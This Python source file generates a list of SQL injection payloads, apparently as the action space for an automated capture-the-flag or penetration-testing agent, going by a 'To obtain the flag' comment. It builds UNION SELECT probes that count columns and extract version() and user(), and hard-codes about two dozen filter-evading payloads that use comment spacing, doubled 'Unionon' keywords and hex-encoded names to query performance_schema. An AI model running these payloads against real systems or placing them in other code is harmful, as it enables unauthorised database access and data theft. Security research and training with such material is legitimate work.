
# def add_escape(instr, escape):
# 	if(esc == "'" or esc == '"'):
# 		esc + instr + esc


def generate_actions(escapes = None, max_columns = 5):

	actions = []
	if(escapes is None):
		escapes = [" '"," ' and 1=2 ", " and 1=2 ", " "]


	for esc in escapes:
		#Detect vulnerability
		# x = "{0} and {0}1{0}={0}1".format(esc) + "--"
		# actions.append(x)
		# x = "{0} and {0}1{0}={0}2".format(esc) + "--"
		# actions.append(x)

		#To detect the number of columns and the required offset
		#Columns
		columns = "1"
		for i in range(2,max_columns+2):
			x = "{0}union select {1}--".format(esc, columns)
			actions.append(x)

			# #XXX As far as I can tell we put the offset on hold and set it to 2 XXX correct me if this is worng
			# x = "{0} union all select {1} --".format(esc, columns)
			# actions.append(x)


			columns = columns + "," + str(i)

		#To obtain the flag
		columns = "version(),user()"
		for i in range(3, max_columns+2):
			x = "{0}union select {1} --".format(esc, columns)
			actions.append(x)

			columns = columns + "," + str(i)
		columns = "version()"
		for i in range(3, max_columns+2):
			x = "{0}union select 1,{1} --".format(esc, columns)
			actions.append(x)


			columns = columns + "," + str(i)
		columns = "user()"
		for i in range(3, max_columns+2):
			x = "{0}union select 1,{1} --".format(esc, columns)
			actions.append(x)


			columns = columns + "," + str(i)

		
	x = ["bmw%27Unionon/**/Select/**/*/**/FROM/**/(Select/**/CONVERT(user()/**/USING/**/utf8mb3))a/**/join/**/(Select/**/VARIABLE_VALUE/**/FROM/**/performance_schema.global_variables/**/WHERE/**/VARIABLE_NAME/**/=/**/0x76657273696f6e)b/**/join/**/(Select/**/3)c/**/join/**/(Select/**/4)d%23", 
		"bmw%27Unionon/**/Select/**/*/**/FROM/**/(Select/**/CONVERT(user()/**/USING/**/utf8mb3))a/**/join/**/(Select/**/VARIABLE_VALUE/**/FROM/**/performance_schema.global_status/**/WHERE/**/VARIABLE_NAME/**/=/**/0x76657273696f6e)b/**/join/**/(Select/**/5)c%23",
	    "bmw%27Union/**/Select/**/*/**/FROM/**/(Select/**/CONVERT(user()/**/USING/**/utf8mb3))a/**/join/**/(Select/**/VARIABLE_VALUE/**/FROM/**/performance_schema.global_status/**/WHERE/**/VARIABLE_NAME/**/=/**/0x76657273696f6e)b/**/join/**/(Select/**/5)c%23",
		"bmw%27Unionon/**/Select/**/VARIABLE_VALUE/**/FROM/**/(Select/**/CONVERT(user()/**/USING/**/utf8mb3))a/**/join/**/(Select/**/VARIABLE_VALUE/**/FROM/**/performance_schema.global_variables/**/WHERE/**/VARIABLE_NAME/**/=/**/0x76657273696f6e)b%23",
		"bmw%27Union/**/Select/**/VARIABLE_VALUE/**/FROM/**/(Select/**/CONVERT(user()/**/USING/**/utf8mb3))a/**/join/**/(Select/**/VARIABLE_VALUE/**/FROM/**/performance_schema.global_variables/**/WHERE/**/VARIABLE_NAME/**/=/**/0x76657273696f6e)b%23",
	    "bmw%27Unionon/**/Select/**/user()/**/FROM/**/(Select/**/CONVERT(user()/**/USING/**/utf8mb3))a/**/join/**/(Select/**/VARIABLE_VALUE/**/FROM/**/performance_schema.global_variables/**/WHERE/**/VARIABLE_NAME/**/=/**/0x76657273696f6e)b%23",
		"bmw%27Union/**/Select/**/user()/**/FROM/**/(Select/**/CONVERT(user()/**/USING/**/utf8mb3))a/**/join/**/(Select/**/VARIABLE_VALUE/**/FROM/**/performance_schema.global_variables/**/WHERE/**/VARIABLE_NAME/**/=/**/0x76657273696f6e)b%23",
		"bmw%27Unionon/**/Select/**/user()/**/FROM/**/(Select/**/CONVERT(user()/**/USING/**/utf8mb3))a/**/join/**/(Select/**/VARIABLE_VALUE/**/FROM/**/performance_schema.global_variables/**/WHERE/**/VARIABLE_NAME/**/=/**/0x76657273696f6e)b/**/join/**/(Select/**/2)c/**/join/**/(Select/**/3)d%23",
		"bmw%27Union/**/Select/**/user()/**/FROM/**/(Select/**/CONVERT(user()/**/USING/**/utf8mb3))a/**/join/**/(Select/**/VARIABLE_VALUE/**/FROM/**/performance_schema.global_variables/**/WHERE/**/VARIABLE_NAME/**/=/**/0x76657273696f6e)b/**/join/**/(Select/**/2)c/**/join/**/(Select/**/3)d%23",
		"bmw%27Unionon/**/Select/**/user()/**/FROM/**/(Select/**/CONVERT(user()/**/USING/**/utf8mb3))a/**/join/**/(Select/**/VARIABLE_VALUE/**/FROM/**/performance_schema.global_variables/**/WHERE/**/VARIABLE_NAME/**/=/**/0x76657273696f6e)b/**/join/**/(Select/**/4)c/**/join/**/(Select/**/5)d%23",
		"bmw%27Union/**/Select/**/user()/**/FROM/**/(Select/**/CONVERT(user()/**/USING/**/utf8mb3))a/**/join/**/(Select/**/VARIABLE_VALUE/**/FROM/**/performance_schema.global_variables/**/WHERE/**/VARIABLE_NAME/**/=/**/0x76657273696f6e)b/**/join/**/(Select/**/4)c/**/join/**/(Select/**/5)d%23",
		"bmw%27Unionon/**/Select/**/*/**/FROM/**/(Select/**/CONVERT(user()/**/USING/**/utf8mb3))a/**/join/**/(Select/**/VARIABLE_VALUE/**/FROM/**/performance_schema.global_variables/**/WHERE/**/VARIABLE_NAME/**/=/**/0x76657273696f6e)b/**/join/**/(Select/**/2)c/**/join/**/(Select/**/3)d%23",
		"bmw%27Union/**/Select/**/*/**/FROM/**/(Select/**/CONVERT(user()/**/USING/**/utf8mb3))a/**/join/**/(Select/**/VARIABLE_VALUE/**/FROM/**/performance_schema.global_variables/**/WHERE/**/VARIABLE_NAME/**/=/**/0x76657273696f6e)b/**/join/**/(Select/**/2)c/**/join/**/(Select/**/3)d%23",
		"bmw%27Unionon/**/Select/**/*/**/FROM/**/(Select/**/CONVERT(user()/**/USING/**/utf8mb3))a/**/join/**/(Select/**/VARIABLE_VALUE/**/FROM/**/performance_schema.global_variables/**/WHERE/**/VARIABLE_NAME/**/=/**/0x76657273696f6e)b%23",
		"bmw%27Union/**/Select/**/*/**/FROM/**/(Select/**/CONVERT(user()/**/USING/**/utf8mb3))a/**/join/**/(Select/**/VARIABLE_VALUE/**/FROM/**/performance_schema.global_variables/**/WHERE/**/VARIABLE_NAME/**/=/**/0x76657273696f6e)b%23",
		"bmw%27Unionon/**/Select/**/*/**/FROM/**/(Select/**/CONVERT(user()/**/USING/**/utf8mb3))a/**/join/**/(Select/**/VARIABLE_VALUE/**/FROM/**/performance_schema.global_status/**/WHERE/**/VARIABLE_NAME/**/=/**/0x76657273696f6e)b/**/join/**/(Select/**/3)c%23",
		"bmw%27Union/**/Select/**/*/**/FROM/**/(Select/**/CONVERT(user()/**/USING/**/utf8mb3))a/**/join/**/(Select/**/VARIABLE_VALUE/**/FROM/**/performance_schema.global_status/**/WHERE/**/VARIABLE_NAME/**/=/**/0x76657273696f6e)b/**/join/**/(Select/**/3)c%23",
		"bmw%27Unionon/**/Select/**/*/**/FROM/**/(Select/**/CONVERT(user()/**/USING/**/utf8mb3))a/**/join/**/(Select/**/VARIABLE_VALUE/**/FROM/**/performance_schema.global_status/**/WHERE/**/VARIABLE_NAME/**/=/**/0x76657273696f6e)b/**/join/**/(Select/**/4)c%23",
		"bmw%27Union/**/Select/**/*/**/FROM/**/(Select/**/CONVERT(user()/**/USING/**/utf8mb3))a/**/join/**/(Select/**/VARIABLE_VALUE/**/FROM/**/performance_schema.global_status/**/WHERE/**/VARIABLE_NAME/**/=/**/0x76657273696f6e)b/**/join/**/(Select/**/4)c%23",
		"bmw%27Unionon/**/Select/**/*/**/FROM/**/(Select/**/CONVERT(user()/**/USING/**/utf8mb3))a/**/join/**/(Select/**/VARIABLE_VALUE/**/FROM/**/performance_schema.global_status/**/WHERE/**/VARIABLE_NAME/**/=/**/0x76657273696f6e)b/**/join/**/(Select/**/2)c/**/join/**/(Select/**/3)d%23",
		"bmw%27Union/**/Select/**/*/**/FROM/**/(Select/**/CONVERT(user()/**/USING/**/utf8mb3))a/**/join/**/(Select/**/VARIABLE_VALUE/**/FROM/**/performance_schema.global_status/**/WHERE/**/VARIABLE_NAME/**/=/**/0x76657273696f6e)b/**/join/**/(Select/**/2)c/**/join/**/(Select/**/3)d%23",
		"bmw%27Unionon/**/Select/**/*/**/FROM/**/(Select/**/CONVERT(user()/**/USING/**/utf8mb3))a/**/join/**/(Select/**/VARIABLE_VALUE/**/FROM/**/performance_schema.global_status/**/WHERE/**/VARIABLE_NAME/**/=/**/0x76657273696f6e)b/**/join/**/(Select/**/3)c/**/join/**/(Select/**/4)d%23",
		"bmw%27Union/**/Select/**/*/**/FROM/**/(Select/**/CONVERT(user()/**/USING/**/utf8mb3))a/**/join/**/(Select/**/VARIABLE_VALUE/**/FROM/**/performance_schema.global_status/**/WHERE/**/VARIABLE_NAME/**/=/**/0x76657273696f6e)b/**/join/**/(Select/**/3)c/**/join/**/(Select/**/4)d%23"
	   ]
	for query in x:
		actions.append(query)
	return actions


if __name__ == "__main__":
	print("start")
	actions = generate_actions()

	print("Possible list of actions", len(actions))
	for action in actions:
		print(action)
